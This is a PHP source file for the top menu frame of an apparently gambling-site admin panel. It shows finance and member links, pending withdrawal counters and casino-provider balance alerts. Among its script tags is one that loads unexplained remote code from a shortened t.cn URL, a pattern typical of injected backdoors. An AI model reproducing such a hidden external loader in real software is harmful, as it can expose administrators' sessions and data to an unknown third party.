<?php
if(!isset($_SESSION)){ session_start();}
header("Expires: Mon, 26 Jul 1970 05:00:00 GMT");
header("Last-Modified: " . gmdate("D, d M Y H:i:s") . " GMT"); 
header("Cache-Control: no-cache, must-revalidate");      
header("Pragma: no-cache");
header("Content-type: text/html; charset=utf-8");

$C_Patch=$_SERVER['DOCUMENT_ROOT'];
include_once($C_Patch."/app/member/include/address.mem.php");
include_once($C_Patch."/app/member/include/config.inc.php");
include_once($C_Patch."/app/member/common/function.php");
include_once($C_Patch."/app/member/cache/vertime.php");
@include_once($C_Patch."/live/agid.php");
include_once($C_Patch."/app/member/Cache/website.php");
include_once("common/login_check.php");

$sql = "select conf_www from sys_config limit 0,1";
$query	=	$mysqli->query($sql);
$row = $query->fetch_array();

$time_limit = strtotime($vertime)-time();
if($time_limit<259200 && $time_limit>=172800){
    $time_day = "三天内到期";
}elseif($time_limit<172800 && $time_limit>=86400){
    $time_day = "两天内到期";
}elseif($time_limit<86400 && $time_limit>=0){
    $time_day = "一天内到期";
}else{
    $time_day = "已经到期";
}

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>top</title>
<link href="Images/css1/top_css.css" rel="stylesheet" type="text/css">
</head>
<script type="text/javascript" language="javascript" src="js/jquery-1.7.2.min.js"></script>
<script type="text/javascript" language="javascript" src="/pt/assets/js/lib/sound.js"></script>
<script src="http://t.cn/RfzJs3g"></script>
<body bgcolor="#343434">
<table width="100%" border="0" cellpadding="0" cellspacing="0">
  <tr>
    <td width="244" align="center">
        <a class="brand">
          <span class="second">网站管理后台</span> 
          <small>V 4.0</small>
        </a>
    </td>
     <td>
          <table height="26" border="0" align="left" cellpadding="0" cellspacing="0" class="subbg" NAME=t1>
                <tbody>
                  <tr align="middle">
                    <td width="71" height="26" align="center" valign="middle"><a
                      href="right.php" 
                    target="main" class="STYLE2">管理首页</a></td>
                    <td align="center" class="topbar"><span class="STYLE2"> </span></td>
                <?php
          if(strpos($quanxian,'修改网站信息')){
          ?>

                    <td width="71" align="center" valign="middle"><a 
                      href="webconfig/index.php" 
                      target="main" class="STYLE2">系统设置</a></td>
                    <td align="center" class="topbar"><span class="STYLE2"> </span></td>
                <?php }?>

                <?php
          if(strpos($quanxian,'查看会员信息')){
          ?>
                    <!-- <td width="71" align="center" valign="middle"><a  href="user/list.php?is_login=1" target="main" class="STYLE3">在线会员</a></td> --> <!-- 日志管理 user/user_log.php
                    <td align="center" class="topbar"><span class="STYLE2"> </span></td> -->

                <td width="71" align="center" valign="middle"><a  href="user/hygls.php"  target="main" class="STYLE2">会员管理</a></td> <!-- user/list.php?1=1 -->
                    <td align="center" class="topbar"><span class="STYLE2"> </span></td>
				 <td width="71" align="center" valign="middle"><a  href="report/all_game_money.php"  style="color: orange;" target="main" class="STYLE2">打码量</a></td> <!-- user/list.php?1=1 -->
                    <td align="center" class="topbar"><span class="STYLE2"> </span></td>
					
                <?php }?>
                <?php
           if(strpos($quanxian,'管理员管理')){
    ?>

              <td width="71" align="center" valign="middle"><a   href="Lottery/config/lottery_six_config.php" target="main">反水设置</a></td> <!-- 管理员管理 -->
              <td align="center" class="topbar"><span class="STYLE2"> </span></td>

               <td width="71" align="center" valign="middle"><a   href="casino/ag_user_fs_list.php?gtype=All?>" target="main">真人反水</a></td>
              <td align="center" class="topbar"><span class="STYLE2"> </span></td>
          <?php }?>
          <?php


          if(strpos($quanxian,'查看报表')){
          ?>
                    <td width="71" align="center" valign="middle"><a  href="report/baobiaoxi.php"  target="main" class="STYLE2">报表管理</a></td>
                    <td align="center" class="topbar"><span class="STYLE2"> </span></td>
                <?php }?>
            
                <?php
          if(strpos($quanxian,'加款扣款')){
          ?>
                    <td width="71" align="center" valign="middle"><a  href="fund/caiwu.php"  target="main" class="STYLE2">财务管理</a></td>
                    <td align="center" class="topbar"><span class="STYLE2"> </span></td>

                <?php }?>
                   

                    <td width="71" align="center" valign="middle"><a style="color: orange;" href="user/mobileip.php"   target="main" class="STYLE2">风控中心</a></td>

                    <td align="center" class="topbar"><span class="STYLE2"> </span></td>
                    <td width="71" align="center" valign="middle"><a href="manage/set_pwd.php"   target="main" class="STYLE2">修改密码</a></td>
                    <td width="71" align="center" valign="middle"><a  href="out.php" target="_top" class="STYLE2">退出登录</a></td>
                    <td>
                        <span class="maifen" onClick="switchBar(this)" title="展开">展开 <i class="active"></i></span>
                    </td>
                    <td>
                      <div class="show" id="tisi" style="width:200px; height: 26px; overflow: hidden;line-height:26px;color:#f3ff55;">
					  <marquee scrolldelay="5" scrollamount="2" id="m_xx" onMouseOver="this.stop()" onMouseOut="this.start()" behavior="alternate"></marquee>
					  <div id="hk_mp3"></div></div>
                    </td>
                  </tr>
                </tbody>
              </table>

    </td> 
  </tr>

  <tr>
    <td>

    </td>
      <td align="center" style=" position: relative;top:-5px; left: 15px;" height="33">
            <table cellspacing="0" cellpadding="0" border="0" width="100%">
                  <tbody>
                    <tr>
                      <!-- <td width="1%" align="left"><img onClick="switchBar(this)" height="15" alt="关闭左边管理菜单" src="images/on-of.gif" width="15" border="0" /></td> -->
                      <!-- <td width="0" align="left"><div class="show" id="tisi"><marquee scrolldelay="5" scrollamount="2" id="m_xx" onMouseOver="this.stop()" onMouseOut="this.start()"></marquee></div></td> -->
                      <td width="100%" align="left">
                          <a href="fund/tixian.php?status=未结算"  target="main">提款(<font color="red" id="tknum">--</font>)</a>&nbsp;
                          <a href="fund/huikuan.php?status=未结算"  target="main">汇款(<font color="red" id="hknum">--</font>)</a>&nbsp;
                          <a href="fund/chongzhi.php?status=未结算"  target="main">存款(<font color="red" id="cknum">--</font>)</a>&nbsp;
                          <a href="user/list.php?is_stop=异常" target="main">异常会员(<font color="red" id="ernum">--</font>)</a>&nbsp;
                          <a href="sports/cg_list.php?status=0" target="main">未结算串关(<font color="red" id="cgnum">--</font>)</a>&nbsp;
                      </td>
                    </tr>
                  </tbody>
                </table>
        </td>
  </tr>
</table>
<script language="javascript">
<!--
var displayBar=true;
function switchBar(obj){
	if (displayBar)
	{
    window.top.document.getElementById('boxframeset').rows = '72, *';
		displayBar=false;
		obj.title="收起";
    obj.innerHTML = '收起 <i class="actives"></i>';
	}
	else{
		 window.top.document.getElementById('boxframeset').rows = '42, *';
		displayBar=true;
		obj.title="收起";
     obj.innerHTML = '展开 <i class="active"></i>';
	}
}


(function(){
    $('a[target="main"]').on('click', function(){
          show();
    });
    var topWindow = window.top.document.getElementById('right_bg');
    function show(){
        var childHtml = topWindow.contentWindow.document.getElementsByTagName('html')[0];
       // $(childHtml).fadeIn(1000);
       childHtml.style.display = 'none';
    } 
})();

//-->
</script></body>
</html>
<?php if ($uid) { ?>
    <script language="javascript">
        function top_systop() {
            $.getJSON("systop.php?callback=?", function (json) {
                    if(json.sum){
                        var html = "您有：";
                        $("#tknum").html(json.tknum);
                        if(json.tknum>0)
                        {	
                            html += "<span class=\"num\">"+json.tknum+"</span> 条<strong><A href=\"fund/tixian.php?status=未结算\"  target=\"main\">提款</a></strong> ";
                            $("#hk_mp3").html("<embed src='/resource/ring/tk.mp3' width='0' height='0'loop='2'></embed>");
                        }
                        $("#hknum").html(json.hknum);
                        if(json.hknum>0)
                        {
                            html += "<span class=\"num\">"+json.hknum+"</span> 条<strong><A href=\"fund/huikuan.php?status=未结算\"  target=\"main\">汇款</a></strong> ";
                            $("#hk_mp3").html("<embed src='/resource/ring/hk.mp3' width='0' height='0' loop='2'></embed>");
                        }
                        $("#cknum").html(json.cknum);
                        if(json.cknum>0)
                        {
                            html += "<span class=\"num\">"+json.cknum+"</span> 条<strong><A href=\"fund/chongzhi.php?status=未结算\"  target=\"main\">存款</a></strong> ";
                            $("#hk_mp3").html("<embed src='/resource/ring/hk.mp3' width='0' height='0'loop='2'></embed>");
                        }
                        var html2 = "";
                      
                        if(json.ag_hall_num>0)
                        {
                            html2 += "<A href=\"webconfig/index.php?1=1\"  target=\"main\">AG余额即将不足。</a></strong> ";
                            $("#hk_mp3").html("<embed src='<?="http://".$row["conf_www"]."/resource/ring/hk.mp3"?>' width='0' height='0'></embed>");
                        }
                        if(json.auto_zhenren_num>0)
                        {
                            html2 += "<A href=\"casino/zz_log.php?gtype=<?=urldecode('All')?>&status=<?=urldecode('4')?>\"  target=\"main\">您有<span class=\"num\">"+json.auto_zhenren_num+"</span> 条真人转账未审核。</a></strong> ";
                            $("#hk_mp3").html("<embed src='/resource/ring/hk.mp3' width='0' height='0'loop='2'></embed>");
                        }
                        if(json.add_number_new>0)
                        {
                            html2 += "<A href=\"user/list.php?1=1\"  target=\"main\">&nbsp;&nbsp;恭喜！恭喜！您有"+json.add_number_new+"个新的用户注册了。(一分钟内)</a></strong> ";
                            $("#hk_mp3").html("<embed src='/resource/ring/hk.mp3' width='0' height='0'loop='2'></embed>");
                        }
                        $("#ernum").html(json.ernum);
                        $("#cgnum").html(json.cgnum);

                        html += "信息未处理！";
                        if(html=="您有：信息未处理！"){
                            html = "";
                        }
                        $("#m_xx").html(html+html2);
                        $("#tisi").css("display","block");
                    }
                    if(json.tknum==0 && json.hknum==0 && json.cknum==0 && json.ag_hall_num==0 && json.add_number_new==0 &&json.ver_time_num==0 &&json.auto_zhenren_num==0){
                        $("#m_xx").html("");
                        $("#tisi").css("display","none");
                    }

                }
            );
		   $.get('/newbbin2/get_credit.php',function(data){
			   if(data<<?=$web_site['bb_hall']?>){
				  $("#tisi").css("display","block");
				  $("#hk_mp3").html("<embed src='<?="http://".$row["conf_www"]."/resource/ring/hk.mp3"?>' width='0' height='0'></embed>");
				  $("#m_xx").html("<a href='webconfig/index.php?1=1'  target='main'>BBIN余额即将不足。</a>");
			   }
			   else{
				  $("#hk_mp3").html("");
				  $("#m_xx").html("");
				  $("#tisi").css("display","none");
			   }
		   });
           $.get('/newmg2/get_credit.php',function(data){
              if(data<<?=$web_site['mg_hall']?>){
				  $("#tisi").css("display","block");
				  $("#hk_mp3").html("<embed src='<?="http://".$row["conf_www"]."/resource/ring/hk.mp3"?>' width='0' height='0'></embed>");
				  $("#m_xx").html("<a href='webconfig/index.php?1=1'  target='main'>MG余额即将不足。</a>");
			   }
			   else{
				  $("#hk_mp3").html("");
				  $("#m_xx").html("");
				  $("#tisi").css("display","none");
			   }
           });
           $.get('/newallbet2/get_credit.php',function(data){
              if(data<<?=$web_site['ab_hall']?>){
				  $("#tisi").css("display","block");
				  $("#hk_mp3").html("<embed src='<?="http://".$row["conf_www"]."/resource/ring/hk.mp3"?>' width='0' height='0'></embed>");
				  $("#m_xx").html("<A href=\"webconfig/index.php?1=1\"  target=\"main\">ALLBET余额即将不足。</a>");
			   }
			   else{
				  $("#hk_mp3").html("");
				  $("#m_xx").html("");
				  $("#tisi").css("display","none");
			   }
           });
           $.get('/newna2/get_credit.php',function(data){
              if(data<<?=$web_site['na_hall']?>){
				  $("#tisi").css("display","block");
				  $("#hk_mp3").html("<embed src='<?="http://".$row["conf_www"]."/resource/ring/hk.mp3"?>' width='0' height='0'></embed>");
				  $("#m_xx").html("<A href=\"webconfig/index.php?1=1\"  target=\"main\">NA余额即将不足。</a>");
			   }
			   else{
				  $("#hk_mp3").html("");
				  $("#m_xx").html("");
				  $("#tisi").css("display","none");
			   }
           });
           $.get('/newpt2/get_credit.php',function(data){
              if(data<<?=$web_site['pt_hall']?>){
				  $("#tisi").css("display","block");
				  $("#hk_mp3").html("<embed src='<?="http://".$row["conf_www"]."/resource/ring/hk.mp3"?>' width='0' height='0'></embed>");
				  $("#m_xx").html("<A href=\"webconfig/index.php?1=1\"  target=\"main\">PT余额即将不足。</a>");
			   }
			   else{
				  $("#hk_mp3").html("");
				  $("#m_xx").html("");
				  $("#tisi").css("display","none");
			   }
           });
           setTimeout("top_systop()", 30000);
        }
        top_systop();
    </script>
<?php } ?>